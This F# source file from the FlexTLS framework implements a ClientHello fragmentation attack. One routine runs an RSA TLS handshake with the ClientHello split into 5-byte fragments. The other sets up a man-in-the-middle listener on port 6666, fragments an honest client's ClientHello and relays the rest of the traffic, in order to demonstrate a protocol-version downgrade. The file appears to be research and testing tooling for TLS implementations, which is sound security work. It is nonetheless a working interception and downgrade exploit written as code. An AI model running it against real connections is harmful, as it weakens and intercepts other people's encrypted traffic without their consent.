﻿#light "off"

module FlexApps.Attack_FragmentClientHello

open Bytes
open Error
open TLSInfo
open TLSConstants

open FlexTLS
open FlexTypes
open FlexConstants
open FlexConnection
open FlexHandshake
open FlexClientHello
open FlexServerHello
open FlexCertificate
open FlexServerHelloDone
open FlexClientKeyExchange
open FlexCCS
open FlexFinished
open FlexState
open FlexSecrets




type Attack_FragmentClientHello =
    class

    static member run (server_name:string, ?port:int, ?fp:fragmentationPolicy) : state =
        let port = defaultArg port FlexConstants.defaultTCPPort in
        let fp = defaultArg fp (All(5)) in

        // Start TCP connection with the server
        let st,_ = FlexConnection.clientOpenTcpConnection(server_name,server_name,port) in

        // Typical RSA key exchange messages

        // Ensure we use RSA
        let fch = {FlexConstants.nullFClientHello with
            ciphersuites = [TLS_RSA_WITH_AES_128_CBC_SHA] } in

        let st,nsc,fch   = FlexClientHello.send(st,fch,fp=fp) in
        let st,nsc,fsh   = FlexServerHello.receive(st,fch,nsc) in
        let st,nsc,fcert = FlexCertificate.receive(st,Client,nsc) in
        let st,fshd      = FlexServerHelloDone.receive(st) in
        let st,nsc,fcke  = FlexClientKeyExchange.sendRSA(st,nsc,fch) in
        let st,_         = FlexCCS.send(st) in
            
        // Start encrypting
        let st           = FlexState.installWriteKeys st nsc in
        
        let log          = fch.payload @| fsh.payload @| fcert.payload @| fshd.payload @| fcke.payload in
        let st,ffC       = FlexFinished.send(st,logRoleNSC=(log,Client,nsc)) in
        let st,_,_       = FlexCCS.receive(st) in

        // Start decrypting
        let st           = FlexState.installReadKeys st nsc in

        let verify_data  = FlexSecrets.makeVerifyData nsc.si nsc.keys.ms Server (log @| ffC.payload) in
        let st,ffS       = FlexFinished.receive(st,verify_data) in
        st

    static member runMITM (accept, server_name:string, ?port:int) : state * state =
        let port = defaultArg port FlexConstants.defaultTCPPort in

        // Start being a Man-In-The-Middle
        let sst,_,cst,_ = FlexConnection.MitmOpenTcpConnections("0.0.0.0",server_name,listener_port=6666,server_cn=server_name,server_port=port) in

        // Receive the Client Hello and check that the protocol version is high enough
        let sst,nsc,sch = FlexClientHello.receive(sst) in
        if not (sch.pv = TLS_1p2 || sch.pv = TLS_1p1) then
            failwith "Fragmented ClientHello should use TLS > 1.0 to demonstrate the downgrade"
        else
                
        // Reuse the honest client hello message, but apply fragmentation
        let cst = FlexHandshake.send(cst,sch.payload,One(5)) in
        let cst = FlexHandshake.send(cst) in

        // Forward the rest of the handshake and the application data
        FlexConnection.passthrough(cst.ns,sst.ns);
        sst,cst

    end
